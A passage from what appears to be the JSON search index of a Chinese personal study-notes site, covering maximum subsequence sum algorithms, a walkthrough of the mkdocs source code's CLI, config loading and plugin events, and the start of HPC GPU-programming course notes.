\n</code></pre></p>"},{"location":"cs/algorithm/ds/topic1/#on2","title":"O(N\u00b2)","text":"<p>\u540c\u6837\u679a\u4e3e\u5f00\u5934\u7ed3\u5c3e\uff0c\u4e0d\u8fc7\u52a8\u6001\u8ba1\u7b97\u5b50\u5e8f\u5217\u548c\uff0c\u7701\u53bb\u6700\u5185\u5c42\u5faa\u73af <pre><code>int MaxSubsequenceSum(const int a[], int N) {\n    int res = 0;\n    for (int i = 0; i &lt; N; ++i) {\n        int now = 0;\n        for (int j = i; j &lt; N; ++j) {\n            now += a[j];\n            res = max(res, now);\n        }\n    }\n    return res;\n}\n</code></pre></p>"},{"location":"cs/algorithm/ds/topic1/#onlogn","title":"O(NlogN)","text":"<p>\u4f7f\u7528\u5206\u6cbb\u7b97\u6cd5</p> \\[ \\begin{align*} T(N) &amp;= 2T(N/2)+cN,\\quad T(1) = O(1) \\\\ &amp;= 2\\left(2T(N/2^2)+cN/2\\right)+cN \\\\ &amp;= 2^kO(1) + ckN\\qquad\\text{where }N/2^k=1 \\\\ &amp;= O(N\\log N) \\end{align*} \\]"},{"location":"cs/algorithm/ds/topic1/#on","title":"O(N)","text":"<p>\u52a8\u6001\u89c4\u5212\u601d\u60f3 <pre><code>int MaxSubsequenceSum(const int a[], int N) {\n    int res = 0, now = 0;\n    for (int i = 0; i &lt; N; ++i) {\n        now += a[i];\n        res = max(res, now);\n        now = max(now, 0);\n    }\n    return res;\n}\n</code></pre></p>"},{"location":"cs/analysis/","title":"\u6e90\u7801\u5256\u6790","text":"<p>Abstract</p> <p>\u4e00\u4e9b\u8bfb\u8fc7\u7684\u9879\u76ee\u6e90\u7801\u5256\u6790\u7b14\u8bb0</p> <p>\u6c34\u5e73\u6709\u9650\uff0c\u4ec5\u4f9b\u53c2\u8003</p>"},{"location":"cs/analysis/#table-of-contents","title":"Table of Contents","text":"<ul> <li>mkdocs \u6e90\u7801\u5256\u6790</li> </ul>"},{"location":"cs/analysis/mkdocs/","title":"mkdocs \u6e90\u7801\u5256\u6790","text":"<p> \u7ea6 1636 \u4e2a\u5b57  135 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u6e90\u9879\u76ee\u5730\u5740\uff1a mkdocs/mkdocs</p> <p>\u5256\u6790\u65f6 sha \u503c\uff1a<code>730da08158</code></p>"},{"location":"cs/analysis/mkdocs/#_1","title":"\u5305\u914d\u7f6e\u3001\u5165\u53e3\u70b9","text":""},{"location":"cs/analysis/mkdocs/#_2","title":"\u5305\u914d\u7f6e","text":"<p>\u4e00\u4e9b\u57fa\u7840\u914d\u7f6e\u4e0d\u5fc5\u8bf4\uff0c\u4e3b\u8981\u662f entry_points \u914d\u7f6e\uff1a <pre><code>setup(\n    ...\n    entry_points={\n        'console_scripts': [\n            'mkdocs = mkdocs.__main__:cli',\n        ],\n        'mkdocs.themes': [\n            'mkdocs = mkdocs.themes.mkdocs',\n            'readthedocs = mkdocs.themes.readthedocs',\n        ],\n        'mkdocs.plugins': [\n            'search = mkdocs.contrib.search:SearchPlugin',\n        ],\n    },\n    ...\n)\n</code></pre> \u53ef\u89c1\u521b\u5efa\u4e86\u4e09\u4e2a entry_points\uff1a</p> <ul> <li>CLI \u547d\u4ee4 mkdocs\uff0c\u5165\u53e3\u70b9 mkdocs.__main__:cli</li> <li>mkdocs.themes\uff0c\u7528\u4e8e\u63a5\u5165\u5916\u90e8\u5305\u5b9a\u4e49\u7684\u4e3b\u9898</li> <li>mkdocs.plugins\uff0c\u7528\u4e8e\u63a5\u5165\u5916\u90e8\u5305\u5b9a\u4e49\u7684\u63d2\u4ef6</li> </ul>"},{"location":"cs/analysis/mkdocs/#_3","title":"\u5165\u53e3\u70b9","text":"<p>\u547d\u4ee4\u884c\u7684\u5165\u53e3\u70b9\u4e3a mkdocs.__main__:cli\u3002\u4e0b\u5206\u6790 __main__.py\uff1a</p> <ul> <li>log \u76f8\u5173\uff1a<ul> <li>\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 ColorFormatter\uff08\u6211\u4e0d\u662f\u5f88\u559c\u6b22\u8fd9\u4e2a\u6837\u5f0f\uff0c\u53ef\u4ee5\u6539\u6389\uff09</li> <li>\u4e00\u4e2a State \u7528\u4e8e\u7ef4\u62a4\u4e0d\u540c\u547d\u4ee4\u7684 log level\uff08\u540e\u6709 <code>click.make_pass_decorator(State, ensure=True)</code>\uff09</li> </ul> </li> <li>cli \u76f8\u5173\uff1a<ul> <li>\u5229\u7528 click \u5e93 <pre><code>@click.group(context_settings={'help_option_names': ['-h', '--help']}) # \u8bbe\u7f6e help \u547d\u4ee4\n@click.version_option( # \u8bbe\u7f6e version \u547d\u4ee4\u548c\u663e\u793a\u4fe1\u606f\n    __version__,\n    '-V',\n    '--version',\n    message=f'%(prog)s, version %(version)s from { PKG_DIR } (Python { PYTHON_VERSION })',\n)\n@common_options # \u901a\u7528\u8bbe\u7f6e\ndef cli(): # \u547d\u4ee4\u884c\u4e3b\u547d\u4ee4 mkdocs\n    \"\"\"\n    MkDocs - Project documentation with Markdown.\n    \"\"\"\n</code></pre></li> <li>\u4e00\u4e9b\u5b50\u547d\u4ee4\uff0c\u9009\u9879\u6dfb\u52a0\u4e0e\u4e0a\u9762\u7c7b\u4f3c\uff0c\u4e0d\u8d58\u8ff0<ul> <li>serve \u5b50\u547d\u4ee4\uff1a\u8c03\u7528 mkdocs.commands.serve.serve \u51fd\u6570</li> <li>build \u5b50\u547d\u4ee4\uff1a\u5904\u7406 config\uff08\u5728 mkdocs.config \u6a21\u5757\u4e2d\u8be6\u7ec6\u5b9a\u4e49\uff09\u3001\u542f\u52a8\u63d2\u4ef6\u3001\u8c03\u7528 mkdocs.commands.build.build \u51fd\u6570\uff0c\u672a\u5931\u8d25\u5219\u8fd0\u884c\u540e\u5173\u95ed\u63d2\u4ef6</li> <li>gh-deploy \u5b50\u547d\u4ee4\uff1a\u5728 build \u540e\u8c03\u7528 mkdocs.commands.gh_deploy.gh_deploy</li> <li>new \u5b50\u547d\u4ee4\uff1a\u8c03\u7528 mkdocs.commands.new.new \u51fd\u6570</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/analysis/mkdocs/#_4","title":"\u5305\u7ed3\u6784\u5206\u6790","text":"<p>\u9664\u53bb tests \u548c\u5176\u5b83\u5197\u4f59\u4ee3\u7801\u540e\uff0c\u5927\u81f4\u5206\u6790\u7684\u6574\u4e2a\u5305\u7ed3\u6784\uff1a <pre><code>mkdocs\n\u251c\u2500\u2500 __init__.py         # \u5b9a\u4e49\u4e86\u7248\u672c\u53f7\n\u251c\u2500\u2500 __main__.py         # CLI \u5165\u53e3\u70b9\n\u251c\u2500\u2500 commands            # CLI \u5b9a\u4e49\n\u2502   \u251c\u2500\u2500 __init__.py     \n\u2502   \u251c\u2500\u2500 babel.py        # \u5904\u7406\u8bed\u8a00\u6587\u4ef6\uff08\u4e0d\u662f CLI \u547d\u4ee4\uff09\n\u2502   \u251c\u2500\u2500 build.py        # \u6784\u5efa\u6587\u6863\uff08mkdocs build\uff09\n\u2502   \u251c\u2500\u2500 gh_deploy.py    # \u90e8\u7f72\u5230 Pages\uff08mkdocs gh-deploy\uff09\n\u2502   \u251c\u2500\u2500 new.py          # \u521b\u5efa\u65b0\u9879\u76ee\uff08mkdocs new\uff09\n\u2502   \u251c\u2500\u2500 serve.py        # \u5f00\u542f\u672c\u5730\u9884\u89c8\u670d\u52a1\uff08mkdocs serve\uff09\n\u2502   \u2514\u2500\u2500 setup.py                # \u76ee\u6d4b\u6ca1\u7528\uff1f\n\u251c\u2500\u2500 config\n\u2502   \u251c\u2500\u2500 __init__.py         # \u53ea\u5bfc\u51fa base \u548c config_options\n\u2502   \u251c\u2500\u2500 base.py             # \u57fa\u7840\u914d\u7f6e\n\u2502   \u251c\u2500\u2500 config_options.py   # \u5404\u79cd\u53c2\u6570\u4ee5\u53ca\u9a8c\u8bc1\u65b9\u5f0f\n\u2502   \u2514\u2500\u2500 defaults.py         # \u9ed8\u8ba4\u914d\u7f6e\n\u251c\u2500\u2500 contrib\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u2514\u2500\u2500 search\n\u2502       \u251c\u2500\u2500 __init__.py\n\u2502       \u251c\u2500\u2500 lunr-language\n\u2502       \u2502   \u2514\u2500\u2500 ...\n\u2502       \u251c\u2500\u2500 prebuild-index.js\n\u2502       \u251c\u2500\u2500 search_index.py\n\u2502       \u2514\u2500\u2500 templates\n\u2502           \u2514\u2500\u2500 search\n\u2502               \u251c\u2500\u2500 lunr.js\n\u2502               \u251c\u2500\u2500 main.js\n\u2502               \u2514\u2500\u2500 worker.js\n\u251c\u2500\u2500 exceptions.py       # \u4e00\u4e9b\u5b9a\u4e49\u7684\u5f02\u5e38\n\u251c\u2500\u2500 livereload\n\u2502   \u2514\u2500\u2500 __init__.py     # \u672c\u5730\u9884\u89c8\u81ea\u52a8\u5237\u65b0\u670d\u52a1\n\u251c\u2500\u2500 localization.py     # \u672c\u5730\u5316\u76f8\u5173\u4ee3\u7801\n\u251c\u2500\u2500 plugins.py          # \u63d2\u4ef6\u7ba1\u7406\n\u251c\u2500\u2500 structure           # \u9875\u9762\u7ed3\u6784\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u251c\u2500\u2500 files.py\n\u2502   \u251c\u2500\u2500 nav.py\n\u2502   \u251c\u2500\u2500 pages.py\n\u2502   \u2514\u2500\u2500 toc.py\n\u251c\u2500\u2500 templates\n\u2502   \u2514\u2500\u2500 sitemap.xml\n\u251c\u2500\u2500 theme.py            # \u4e3b\u9898\u7c7b\n\u251c\u2500\u2500 themes\n\u2502   \u2514\u2500\u2500 ...\n\u2514\u2500\u2500 utils\n    \u251c\u2500\u2500 __init__.py\n    \u251c\u2500\u2500 babel_stub.py\n    \u251c\u2500\u2500 filters.py\n    \u2514\u2500\u2500 meta.py\n</code></pre></p>"},{"location":"cs/analysis/mkdocs/#_5","title":"\u4e00\u4e9b\u5de5\u5177\u6027\u4ee3\u7801","text":"<p>\u548c\u8fd0\u884c\u4e3b\u903b\u8f91\u65e0\u5927\u5173\u7cfb\u7684\u4e00\u4e9b\u4ee3\u7801\uff1a</p>"},{"location":"cs/analysis/mkdocs/#exceptionspy","title":"exceptions.py","text":"<p>\u5b9a\u4e49\u4e86\u4e94\u4e2a\u5f02\u5e38\u7c7b\uff1a</p> <ul> <li>\u57fa\u7c7b MkDocsException\uff0c\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528\u3002\u7ee7\u627f\u81ea ClickException\uff0c\u4f7f click \u80fd\u591f\u5904\u7406\u5e76\u663e\u793a</li> <li>Abort\uff0c\u7ec8\u6b62\u6267\u884c\uff0c\u53ef\u4ee5\u5e26\u6709\u4fe1\u606f</li> <li>ConfigurationError\uff0c\u7531\u4e8e\u914d\u7f6e\u6587\u4ef6\u539f\u56e0\u5bfc\u81f4\u7684\u9519\u8bef</li> <li>BuildError\uff0c\u6784\u5efa\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u9519\u8bef\uff0cmkdocs \u6e90\u7801\u4e2d\u5e76\u672a\u76f4\u63a5\u629b\u51fa\u6b64\u7c7b\u9519\u8bef\uff0c\u4f46\u6709\u5b50\u7c7b PluginError\uff0c\u5e94\u8be5\u662f\u7ed9\u7b2c\u4e09\u65b9\u63d2\u4ef6\u4f7f\u7528\u7684</li> <li>PluginError\uff0c\u5728\u63d2\u4ef6\u4e2d\u53ef\u4ee5\u629b\u51fa\u7684\u5f02\u5e38\uff0c\u7ee7\u627f\u81ea BuildError</li> </ul>"},{"location":"cs/analysis/mkdocs/#utils","title":"utils","text":""},{"location":"cs/analysis/mkdocs/#build","title":"build \u6d41\u7a0b","text":"<p>\u4ece mkdocs build \u8fd9\u4e00\u547d\u4ee4\u7684\u6267\u884c\u6d41\u7a0b\u6765\u9010\u6b65\u81ea\u9876\u5411\u4e0b\u5206\u6790</p> <p>\u9996\u5148\u4ece __main__.py \u8fdb\u5165\uff0c\u8c03\u7528\u5230 build_command \u51fd\u6570\uff1a __main__.py<pre><code>@cli.command(name=\"build\")\n@click.option('-c', '--clean/--dirty', is_flag=True, default=True, help=clean_help)\n@common_config_options\n@click.option('-d', '--site-dir', type=click.Path(), help=site_dir_help)\n@common_options\ndef build_command(clean, **kwargs):\n    \"\"\"Build the MkDocs documentation\"\"\"\n    from mkdocs.commands import build\n\n    _enable_warnings()\n    cfg = config.load_config(**kwargs)\n    cfg['plugins'].run_event('startup', command='build', dirty=not clean)\n    try:\n        build.build(cfg, dirty=not clean)\n    finally:\n        cfg['plugins'].run_event('shutdown')\n</code></pre> \u5176\u4e2d common_options \u548c common_config_options \u88c5\u9970\u5668\u5b9a\u4e49\u4e3a\uff1a __main__.py<pre><code>common_options = add_options(quiet_option, verbose_option)\ncommon_config_options = add_options(\n    click.option('-f', '--config-file', type=click.File('rb'), help=config_help),\n    # Don't override config value if user did not specify --strict flag\n    # Conveniently, load_config drops None values\n    click.option('-s', '--strict', is_flag=True, default=None, help=strict_help),\n    click.option('-t', '--theme', type=click.Choice(theme_choices), help=theme_help),\n    # As with --strict, set the default to None so that this doesn't incorrectly\n    # override the config file\n    click.option(\n        '--use-directory-urls/--no-directory-urls',\n        is_flag=True,\n        default=None,\n        help=use_directory_urls_help,\n    ),\n)\n</code></pre> \u4e5f\u5c31\u662f\u589e\u52a0\u4e86 -q -v -f -s -t --use-directory-urls/--no-directory-urls \u8fd9\u4e9b\u547d\u4ee4\u884c\u53c2\u6570\uff08\u4e5f\u4f1a\u4f20\u5230 kwargs \u4e2d\uff09</p> <p>_enable_warnings() \u53ef\u4ee5\u4e0d\u7528\u7ba1\u3002\u4e4b\u540e\u7684\u6d41\u7a0b\u5c31\u662f\uff1a</p> <ol> <li>\u8c03\u7528 config.load_config \u52a0\u8f7d\u914d\u7f6e</li> <li>\u4ece\u914d\u7f6e\u4e2d\u627e\u5230\u63d2\u4ef6\uff0c\u5e76\u89e6\u53d1\u5176 startup \u4e8b\u4ef6</li> <li>\u5c1d\u8bd5\u8c03\u7528 build.build \u51fd\u6570\u6784\u5efa\u6587\u6863<ul> <li>\u82e5\u4e0d\u6210\u529f\u5219\u76f4\u63a5\u6302\u6389\u7a0b\u5e8f</li> <li>\u82e5\u6210\u529f\u5219\u89e6\u53d1\u63d2\u4ef6\u7684 shutdown \u4e8b\u4ef6\uff0c\u8fd0\u884c\u7ed3\u675f</li> </ul> </li> </ol>"},{"location":"cs/analysis/mkdocs/#_6","title":"\u52a0\u8f7d\u914d\u7f6e","text":"<p>config/base.py \u4e2d 261 \u884c\u5f00\u59cb\u7684\u51fd\u6570 load_config\uff08\u5220\u9664\u4e86\u6ce8\u91ca\u548c\u4e00\u4e9b\u7a7a\u884c\uff09\uff1a config/base.py<pre><code>def load_config(config_file: Optional[Union[str, IO]] = None, **kwargs) -&gt; Config:\n    options = kwargs.copy()\n    for key, value in options.copy().items():\n        if value is None:\n            options.pop(key)\n    with _open_config_file(config_file) as fd:\n        options['config_file_path'] = getattr(fd, 'name', '')\n        from mkdocs.config import defaults\n        cfg = Config(schema=defaults.get_schema(), config_file_path=options['config_file_path'])\n        cfg.load_file(fd)\n    cfg.load_dict(options)\n    errors, warnings = cfg.validate()\n    for config_name, warning in warnings:\n        log.warning(f\"Config value: '{config_name}'. Warning: {warning}\")\n    for config_name, error in errors:\n        log.error(f\"Config value: '{config_name}'. Error: {error}\")\n    for key, value in cfg.items():\n        log.debug(f\"Config value: '{key}' = {value!r}\")\n    if len(errors) &gt; 0:\n        raise exceptions.Abort(f\"Aborted with {len(errors)} Configuration Errors!\")\n    elif cfg['strict'] and len(warnings) &gt; 0:\n        raise exceptions.Abort(\n            f\"Aborted with {len(warnings)} Configuration Warnings in 'strict' mode!\"\n        )\n    return cfg\n</code></pre></p> <p>\u8fd9\u4e2a\u51fd\u6570\u4e2d\u7684\u6d41\u7a0b\uff1a</p> <ol> <li>\u5c06 kwargs \u62f7\u8d1d\u5230 options \u4e2d\uff08\u4e5f\u5c31\u662f\u901a\u8fc7\u547d\u4ee4\u884c\u4f20\u5165\u7684\u53c2\u6570\uff09\u5e76\u5220\u6389\u503c\u4e3a None \u7684\u914d\u7f6e</li> <li>\u901a\u8fc7 _open_config_file \u8fd9\u4e2a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u6765\u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff0c\u7136\u540e\uff1a<ol> <li>\u83b7\u53d6\u5b9e\u9645\u4f7f\u7528\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u540d\uff0c\u5e76\u5b58\u5230 options \u4e2d</li> <li>\u6839\u636e defaults \u521b\u5efa\u4e00\u4e2a Config \u540d\u53eb cfg\uff0c\u5176\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e3a\u4e0a\u9762\u83b7\u5f97\u5230\u7684\u6587\u4ef6\u540d</li> <li>\u5c06\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u8f7d\u5165 cfg</li> </ol> </li> <li>\u5c06\u547d\u4ee4\u884c\u53c2\u6570 options \u8f7d\u5165 cfg\uff08\u6b64\u65f6\u6709\u8986\u76d6\uff0c\u5373\u547d\u4ee4\u884c\u914d\u7f6e\u4f18\u5148\u7ea7\u9ad8\u4e8e\u914d\u7f6e\u6587\u4ef6\uff09</li> <li>\u68c0\u67e5 cfg \u914d\u7f6e\u4e2d\u662f\u5426\u6709\u975e\u6cd5\u4fe1\u606f<ul> <li>\u4ee5 debug level \u8f93\u51fa\u6240\u6709\u914d\u7f6e\u9879</li> <li>\u5982\u679c\u6709\u975e\u6cd5\u914d\u7f6e\u7684\u8bdd\u8f93\u51fa\u5168\u90e8 warnings \u548c errors</li> <li>\u5982\u679c\u6709 error\uff0c\u5219\u76f4\u63a5 abort</li> <li>\u5982\u679c\u6709 warning\uff0c\u4e14\u5f00\u542f\u4e86 strict \u6a21\u5f0f\uff0c\u4e5f\u76f4\u63a5 abort</li> </ul> </li> <li>\u8fd4\u56de\u5f97\u5230\u7684 cfg \u914d\u7f6e\u5b9e\u4f8b</li> </ol> <p>\u5176\u4e2d\u7684\u4e00\u4e9b\u7ec6\u8282\uff1a</p>"},{"location":"cs/analysis/mkdocs/#_open_config_file","title":"_open_config_file","text":"<p>\u662f\u7528 contextmanager \u88c5\u9970\u5668\u5305\u88c5\u5f97\u5230\u7684\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff0c\u5176\u63a5\u6536\u4e00\u4e2a\u53c2\u6570 config_file\uff0c\u662f\u4ece\u547d\u4ee4\u884c --config-file \u53c2\u6570\u83b7\u5f97\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff0c\u5982\u679c\u8fd0\u884c\u65f6\u6ca1\u6709\u8fd9\u4e00\u53c2\u6570\u5219 config_file \u4e3a None\u3002\u5176\u5185\u90e8\u6d41\u7a0b\uff1a</p> <ol> <li>\u5982\u679c config_file \u4e3a None\uff08\u5373\u672a\u6307\u5b9a\uff09\uff0c\u5219\u9ed8\u8ba4\u5c1d\u8bd5\u8bfb\u53d6\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u7684\u914d\u7f6e\u6587\u4ef6 mkdocs.yml \u6216 .yaml</li> <li>\u5982\u679c config_file \u4e3a\u5b57\u7b26\u4e32\uff0c\u5219\u5c1d\u8bd5\u8bfb\u53d6\u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u7684\u6587\u4ef6</li> <li>\u5982\u679c config_file \u662f\u6587\u4ef6\u5bf9\u8c61<ul> <li>\u5982\u679c\u6587\u4ef6\u662f\u5f00\u542f\u7684\uff0c\u5219\u76f4\u63a5\u5c06\u6587\u4ef6\u6307\u9488\u79fb\u5230\u5f00\u5934</li> <li>\u5982\u679c\u6587\u4ef6\u65f6\u5173\u95ed\u7684\uff0c\u5219\u83b7\u53d6\u540d\u79f0\uff0c\u6253\u5f00\u6587\u4ef6</li> </ul> </li> <li>\u8bfb\u53d6\u5b8c\u6210\u540e\uff0c\u5173\u6389\u6587\u4ef6</li> </ol>"},{"location":"cs/analysis/mkdocs/#config","title":"\u521b\u5efa Config\u3001\u8f7d\u5165\u914d\u7f6e","text":"<p>Config \u662f\u4e00\u4e2a\u57fa\u4e8e UserDict \u7684\u7c7b\uff0c\u5373\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 [] \u6765\u8bfb\u53d6\u5176\u4e2d .data \u5c5e\u6027\uff08\u5b57\u5178\uff09\u4e2d\u7684\u503c\uff0c\u5176\u5728\u521d\u59cb\u5316\u65f6\u53d1\u751f\u4e86\u4e0b\u9762\u51e0\u4ef6\u4e8b\uff1a</p> <ol> <li>\u4ece\u53c2\u6570\u8bbe\u7f6e _schema\uff0c\u5373\u4ece defaults \u4e2d\u8bfb\u53d6\u5230\u7684\u9ed8\u8ba4\u53c2\u6570\u90e8\u5206\u3002\u4ee5\u53ca _schema_keys</li> <li>\u8bbe\u7f6e config_file_path\uff08\u4f1a\u81ea\u52a8\u89e3\u7801 bytes \u7c7b\u578b\uff09</li> <li>\u521b\u5efa .data \u5b57\u5178\u5c5e\u6027\uff0c\u4ee5\u53ca\u4e00\u4e2a\u7a7a\u7684 user_configs \u5217\u8868\uff0c\u91cc\u9762\u5b58\u653e\u8f7d\u5165\u7684\u5b57\u5178\u539f\u6570\u636e</li> <li>\u8c03\u7528 set_defaults \u65b9\u6cd5\u8bbe\u7f6e\u9ed8\u8ba4\u503c<ul> <li>\u5373\u4ece schema \u4e2d\u8bfb\u53d6\u8bbe\u7f6e</li> </ul> </li> </ol> <p>\u5728\u8c03\u7528 load_file \u65b9\u6cd5\u65f6\u5b9e\u9645\u4e0a\u4f1a\u8bfb\u53d6 yaml \u6587\u4ef6\u5185\u5bb9\uff0c\u89e3\u6790\u6210\u5b57\u5178\u7136\u540e\u8c03\u7528 load_dict \u65b9\u6cd5\u3002\u8c03\u7528 load_dict \u65b9\u6cd5\u65f6\u5148\u5c06\u4f20\u5165\u7684\u5185\u5bb9\u76f4\u63a5\u6dfb\u52a0\u5230 user_configs \u5217\u8868\u4e2d\uff0c\u7136\u540e\u7528\u5176 update data \u5c5e\u6027</p>"},{"location":"cs/analysis/mkdocs/#config_1","title":"\u9a8c\u8bc1 Config","text":"<p>\u8c03\u7528 Config.validate \u9a8c\u8bc1\u6709\u4ee5\u4e0b\u51e0\u6b65\uff1a</p> <ol> <li>\u8c03\u7528 _pre_validate() \u65b9\u6cd5<ul> <li>\u5176\u4f1a\u904d\u5386 _schema \u6bcf\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u8c03\u7528 config_option \u4e0a\u7684 pre_validation \u65b9\u6cd5\uff0c\u5177\u4f53\u7531\u5b9e\u9645\u5b50\u7c7b\u8fdb\u884c\u5b9e\u73b0</li> </ul> </li> <li>\u8c03\u7528 _validate() \u65b9\u6cd5<ul> <li>\u4e5f\u4f1a\u904d\u5386 _schema \u6bcf\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u4f46\u6b64\u65f6\u4f1a\u5c06\u952e\u5728 config \u4e2d\u5bf9\u5e94\u7684\u503c\u4f20\u5165 config_option \u7684 validate \u65b9\u6cd5\uff08\u7531\u5b50\u7c7b\u7684 run_validation \u65b9\u6cd5\u5b9e\u73b0\uff0c\u8fd4\u56de\u4e00\u4e2a\u4fee\u6b63\u540e\u7684\u503c\uff0c\u91cd\u65b0\u8d4b\u503c\u56de\u6765</li> <li>\u9664\u6b64\u4e4b\u5916\u8fd8\u4f1a\u68c0\u67e5\u4e0d\u5728 _schema_keys \u4e2d\u7684\u952e\uff0c\u5e76\u629b\u51fa\u8b66\u544a</li> </ul> </li> <li>\u5982\u679c\u524d\u9762\u90fd\u6ca1\u6709\u51fa\u73b0 error\uff0c\u5219\u8c03\u7528 _post_validate \u65b9\u6cd5<ul> <li>\u540c pre\uff0c\u53ea\u4e0d\u8fc7\u5bf9 config_option \u8c03\u7528\u7684\u65b9\u6cd5\u4ece pre \u6362\u6210\u4e86 post</li> </ul> </li> </ol> <p>\u5177\u4f53\u7684\u5404\u4e2a\u53c2\u6570\u7684\u5b9a\u4e49\u548c\u9a8c\u8bc1\u65b9\u6cd5\u90fd\u5728 config/config_options.py \u4e2d\uff0c\u5f88\u8be6\u7ec6\u6613\u61c2</p>"},{"location":"cs/analysis/mkdocs/#plugin","title":"\u89e6\u53d1 Plugin \u4e8b\u4ef6","text":"<p>\u5728\u524d\u9762 ConfigOptions \u4e2d\u6709\u4e00\u4e2a Plugins \u5b50\u7c7b\uff0c\u6765\u5b58\u653e\u63d2\u4ef6\u76f8\u5173\u5bf9\u8c61\uff0c\u5176\u521d\u59cb\u5316\u65f6\u4f1a\u8c03\u7528 plugins.get_plugins() \u51fd\u6570\u6765\u5168\u5c40\u68c0\u67e5\u5b89\u88c5\u7684\u5305\u7684 entry_points \u662f\u5426\u542b\u6709 mkdocs.plugins\uff0c\u6765\u5f97\u5230\u4e00\u4e2a Dict[str, EntryPoint] \u7c7b\u578b\u7684 installed_plugins \u5c5e\u6027\uff08\u5373\u901a\u8fc7\u5305\u540d\u6620\u5c04\u5230\u63d2\u4ef6\u5165\u53e3\u70b9\uff0c\u5373\u63d2\u4ef6\u7c7b\uff09</p> <p>\u8fd9\u4e2a Plugins \u7c7b\u5728\u4e0a\u9762\u6240\u8bf4\u7684 run_validation \u8fc7\u7a0b\u4e2d\u4f1a\u5c06\u63d2\u4ef6\u540d\u4f20\u5165 load_plugin \u65b9\u6cd5\uff08\u91cc\u9762\u4f1a\u68c0\u67e5\u662f\u5426\u5b89\u88c5\u7b49\u4e00\u7cfb\u5217\u95ee\u9898\uff09\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u63d2\u4ef6\u7c7b\uff0c\u7edf\u4e00\u6536\u96c6\u5230 plugins.PluginCollection \u7c7b\u4e2d\u3002</p> <p>\u5728\u4e3a PluginCollection setitem \u7684\u65f6\u5019\u4f1a\u5c06\u63d2\u4ef6\u7684\u6240\u6709 on_ \u5f00\u5934\u7684\u65b9\u6cd5\u90fd\u6ce8\u518c\u4e3a event\uff08\u5982 on_startup \u65b9\u6cd5\u4f1a\u6ce8\u518c\u4e00\u4e2a\u540d\u4e3a startup \u7684 event\uff09\uff0c\u5728\u8c03\u7528 run_event(\"startup\") \u7684\u65f6\u5019\u4f1a\u8c03\u7528\u6240\u6709\u6709 on_startup \u65b9\u6cd5\u7684\u63d2\u4ef6\u7684\u8fd9\u4e00\u65b9\u6cd5\uff0c\u4ece\u800c\u6267\u884c\u63d2\u4ef6\u81ea\u5b9a\u4e49\u7684\u521d\u59cb\u5316\u4ee3\u7801\uff08\u540c\u65f6\u53ef\u4ee5\u6839\u636e\u4f20\u5165\u7684 command\uff0c\u5982 \"build\"\u3001\"gh-deploy\"\u3001\"serve\" \u6765\u7279\u5224\u6267\u884c\u4e0d\u540c\u52a8\u4f5c\uff09</p>"},{"location":"cs/analysis/mkdocs/#build_1","title":"\u8c03\u7528 build \u51fd\u6570\u6784\u5efa\u6587\u6863","text":""},{"location":"cs/hpc/hpc101/","title":"HPC 101 \u8d85\u7b97\u5c0f\u5b66\u671f","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\u7efc\u5408\u5b9e\u8df5 \u2160 \u7cfb\u5217\u4e4b\u8d85\u7b97\u5b9e\u8bad\u8bfe\u7a0b\u7b14\u8bb0\uff0c\u540e\u9762\u7684\u4e0d\u592a\u5168\uff0c\u4ee5\u540e\u4e5f\u4e0d\u4f1a\u641e\u8d85\u7b97\uff0c\u4e0d\u518d\u66f4\u65b0\u4e86</p> <ul> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u8d85\u7b97\u5b9e\u8bad\uff08HPC\uff09</li> </ul>"},{"location":"cs/hpc/hpc101/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u5411\u91cf\u5316\u8ba1\u7b97</li> <li>GPU \u7f16\u7a0b</li> <li>OpenMP \u57fa\u7840</li> <li>MPI \u57fa\u7840</li> <li>\u673a\u5668\u5b66\u4e60\u57fa\u7840</li> </ul>"},{"location":"cs/hpc/hpc101/gpu/","title":"GPU \u7f16\u7a0b","text":"<p> \u7ea6 2926 \u4e2a\u5b57  148 \u884c\u4ee3\u7801  14 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Abstract</p> <p>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516d\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e09\u6b21\u5b9e\u9a8c\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516d\u6b21\u8bfe PPT</li> <li>NVIDIA Deep Learning Institute\uff1a\u52a0\u901f\u8ba1\u7b97\u57fa\u7840 \u2014\u2014 CUDA C/C++</li> </ul>"},{"location":"cs/hpc/hpc101/gpu/#gpu_1","title":"GPU","text":"<p>\u63d0\u4f9b\u66f4\u9ad8\u7b97\u529b</p> <ul> <li>CPU\uff1a\u6838\u6570\u5c11\u3001\u590d\u6742\uff1bcache \u5f88\u5927\uff1b\u5185\u5b58\u5927\u4f46\u6162\uff1b\u9002\u5408\u4e32\u884c\u6216\u7b80\u5355\u5e76\u884c</li> <li>GPU\uff1a\u6838\u6570\u5f88\u591a\u3001\u7b80\u5355\uff1bcache 